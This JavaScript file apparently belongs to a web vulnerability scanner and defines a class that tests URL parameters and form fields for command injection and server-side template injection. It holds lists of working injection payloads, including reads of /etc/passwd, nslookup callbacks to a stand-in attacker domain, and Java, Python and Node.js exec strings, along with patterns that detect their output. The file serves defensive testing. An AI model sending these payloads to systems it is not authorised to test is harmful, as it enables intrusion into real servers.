import { BaseScanner } from './BaseScanner.js';

export class RCEScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'RCE Scanner';
    
    // Command injection payloads
    this.payloads = [
      // Basic command injection
      '; id',
      '| id',
      '|| id',
      '& id',
      '&& id',
      '`id`',
      '$(id)',
      
      // Newline injection
      '\n id',
      '\r\n id',
      '%0a id',
      '%0d%0a id',
      
      // Time-based payloads
      '; sleep 5',
      '| sleep 5',
      '|| sleep 5',
      '& sleep 5 &',
      '&& sleep 5',
      '`sleep 5`',
      '$(sleep 5)',
      
      // Windows payloads
      '| ping -n 5 127.0.0.1',
      '& ping -n 5 127.0.0.1',
      '|| ping -n 5 127.0.0.1',
      '&& ping -n 5 127.0.0.1',
      '| timeout 5',
      
      // Blind detection with DNS
      '| nslookup test.attacker.com',
      '& nslookup test.attacker.com',
      '$(nslookup test.attacker.com)',
      
      // Common vulnerable functions
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '; type c:\\windows\\system32\\drivers\\etc\\hosts',
      '| type c:\\windows\\system32\\drivers\\etc\\hosts',
      
      // Filter bypass
      ';${IFS}id',
      ';$IFS\'id\'',
      '{id}',
      '|${IFS}id',
      
      // Python code injection
      '__import__("os").system("id")',
      'eval("__import__(\'os\').system(\'id\')")',
      
      // Node.js/JavaScript injection
      'require("child_process").exec("id")',
      'process.mainModule.require("child_process").exec("id")',
      
      // Ruby injection
      '`id`',
      'system("id")',
      '%x(id)',
      
      // Perl injection
      '|id|',
      'print `id`'
    ];
    
    // Code injection payloads (eval, etc.)
    this.codeInjectionPayloads = [
      // PHP
      '${phpinfo()}',
      '${system(id)}',
      '<?php phpinfo(); ?>',
      '<?= system("id") ?>',
      
      // Template injection
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '{7*7}',
      '[[7*7]]',
      '#{7*7}',
      
      // Server-Side Template Injection (SSTI)
      '{{config}}',
      '{{self.__class__.__mro__}}',
      '${T(java.lang.Runtime).getRuntime().exec("id")}',
      '{{"".__class__.__mro__[2].__subclasses__()}}',
      
      // Expression Language Injection
      '${applicationScope}',
      '${7*7}',
      '#{7*7}',
      '${{7*7}}',
      '*{7*7}'
    ];
    
    // Parameters commonly used for command execution
    this.cmdParameters = [
      'cmd', 'exec', 'command', 'execute', 'run',
      'ping', 'host', 'ip', 'process', 'do',
      'action', 'shell', 'payload', 'cli', 'daemon',
      'arg', 'args', 'arguments', 'options', 'opt'
    ];
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Identify potentially dangerous parameters
    const potentialParams = parameters.filter(p => 
      this.cmdParameters.some(cp => p.toLowerCase().includes(cp))
    );
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          if (potentialParams.includes(key)) {
            const vulns = await this.testParameter(url, key, value);
            vulnerabilities.push(...vulns);
          }
        }
      } catch (error) {
        this.log(`RCE URL parse error: ${error.message}`, 'debug');
      }
    }
    
    // Test forms
    for (const form of forms) {
      if (this.stopped) break;
      
      for (const input of form.inputs) {
        if (!input.name) continue;
        
        if (this.cmdParameters.some(cp => input.name.toLowerCase().includes(cp))) {
          const vulns = await this.testFormInput(form, input);
          vulnerabilities.push(...vulns);
        }
      }
    }
    
    // Also test for SSTI on all parameters
    const sstiVulns = await this.testSSTI(urls);
    vulnerabilities.push(...sstiVulns);
    
    return vulnerabilities;
  }
  
  async testParameter(baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    
    // Test command injection
    const cmdPayloads = this.getTestPayloads('cmd');
    
    for (const payload of cmdPayloads) {
      if (this.stopped) break;
      
      try {
        const testUrl = new URL(baseUrl);
        testUrl.searchParams.set(paramName, originalValue + payload);
        
        const startTime = Date.now();
        const response = await this.makeRequest(testUrl.href, { timeout: 15000 });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        const rceIndicators = this.detectRCE(response.data, payload, duration);
        
        if (rceIndicators.detected) {
          vulnerabilities.push({
            type: 'RCE',
            subType: rceIndicators.type,
            severity: 'critical',
            url: baseUrl,
            parameter: paramName,
            payload: payload,
            evidence: rceIndicators.evidence,
            description: `Remote Code Execution vulnerability in parameter "${paramName}". ${rceIndicators.description}`,
            remediation: 'Never pass user input to system commands. Use allowlists for allowed operations. Implement strict input validation. Use safe APIs instead of shell commands.',
            references: [
              'https://portswigger.net/web-security/os-command-injection',
              'https://owasp.org/www-community/attacks/Command_Injection'
            ],
            cvss: 10.0,
            cwe: 'CWE-78'
          });
          
          break;
        }
      } catch (error) {
        this.log(`RCE test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testFormInput(form, input) {
    const vulnerabilities = [];
    const cmdPayloads = this.getTestPayloads('cmd');
    
    for (const payload of cmdPayloads) {
      if (this.stopped) break;
      
      const formData = {};
      form.inputs.forEach(inp => {
        formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
      });
      
      try {
        const startTime = Date.now();
        const response = await this.makeRequest(form.action, {
          method: form.method,
          data: form.method === 'POST' ? formData : undefined,
          params: form.method === 'GET' ? formData : undefined,
          timeout: 15000
        });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        const rceIndicators = this.detectRCE(response.data, payload, duration);
        
        if (rceIndicators.detected) {
          vulnerabilities.push({
            type: 'RCE',
            subType: rceIndicators.type,
            severity: 'critical',
            url: form.action,
            method: form.method,
            parameter: input.name,
            payload: payload,
            evidence: rceIndicators.evidence,
            description: `RCE vulnerability in form field "${input.name}"`,
            remediation: 'Never execute user-controlled commands.',
            references: [
              'https://portswigger.net/web-security/os-command-injection'
            ],
            cvss: 10.0,
            cwe: 'CWE-78'
          });
          break;
        }
      } catch (error) {
        this.log(`RCE form test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testSSTI(urls) {
    const vulnerabilities = [];
    
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          // Test SSTI with math expression
          const sstiPayload = '{{7*7}}';
          const testUrl = new URL(url);
          testUrl.searchParams.set(key, sstiPayload);
          
          const response = await this.makeRequest(testUrl.href);
          if (!response) continue;
          
          // Check if 49 appears (7*7=49)
          if (response.data && response.data.toString().includes('49')) {
            vulnerabilities.push({
              type: 'SSTI',
              subType: 'Server-Side Template Injection',
              severity: 'critical',
              url: url,
              parameter: key,
              payload: sstiPayload,
              evidence: 'Template expression {{7*7}} evaluated to 49',
              description: `Server-Side Template Injection in parameter "${key}". This can lead to RCE.`,
              remediation: 'Use logic-less templates when possible. Sanitize user input before template processing. Use sandboxed template environments.',
              references: [
                'https://portswigger.net/web-security/server-side-template-injection'
              ],
              cvss: 9.8,
              cwe: 'CWE-94'
            });
            break;
          }
        }
      } catch (error) {
        this.log(`SSTI test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  detectRCE(body, payload, duration) {
    const result = {
      detected: false,
      type: '',
      evidence: '',
      description: ''
    };
    
    if (!body) return result;
    const bodyStr = body.toString();
    
    // Command output indicators
    const cmdOutputPatterns = [
      { pattern: /uid=\d+\([a-z]+\)\s+gid=\d+/i, type: 'Command Output (id)', desc: 'id command output detected' },
      { pattern: /root:.*:0:0:/i, type: 'File Content (/etc/passwd)', desc: 'passwd file content leaked' },
      { pattern: /Linux\s+\S+\s+\d+\.\d+/i, type: 'System Info (uname)', desc: 'System information leaked' },
      { pattern: /Reply from 127\.0\.0\.1/i, type: 'Command Output (ping)', desc: 'ping command output detected' },
      { pattern: /TTL=\d+/i, type: 'Command Output (ping)', desc: 'Windows ping output detected' }
    ];
    
    for (const p of cmdOutputPatterns) {
      if (p.pattern.test(bodyStr)) {
        result.detected = true;
        result.type = p.type;
        result.evidence = bodyStr.match(p.pattern)[0];
        result.description = p.desc;
        return result;
      }
    }
    
    // Time-based detection
    if (payload.includes('sleep') && duration >= 5000) {
      result.detected = true;
      result.type = 'Time-based Command Injection';
      result.evidence = `Response delayed by ${duration}ms after sleep command`;
      result.description = 'Time-based command injection confirmed';
      return result;
    }
    
    // Error-based detection
    const errorPatterns = [
      /sh: \d+: [a-z]+: not found/i,
      /command not found/i,
      /is not recognized as an internal or external command/i,
      /Cannot run program/i
    ];
    
    for (const pattern of errorPatterns) {
      if (pattern.test(bodyStr)) {
        result.detected = true;
        result.type = 'Error-based Command Injection';
        result.evidence = bodyStr.match(pattern)[0];
        result.description = 'Error message indicates command execution attempt';
        return result;
      }
    }
    
    return result;
  }
  
  getTestPayloads(type) {
    if (type === 'cmd') {
      return [
        '| id',
        '; id',
        '`id`',
        '$(id)',
        '| sleep 5',
        '; sleep 5',
        '& ping -c 5 127.0.0.1 &'
      ];
    }
    return this.codeInjectionPayloads.slice(0, 5);
  }
}
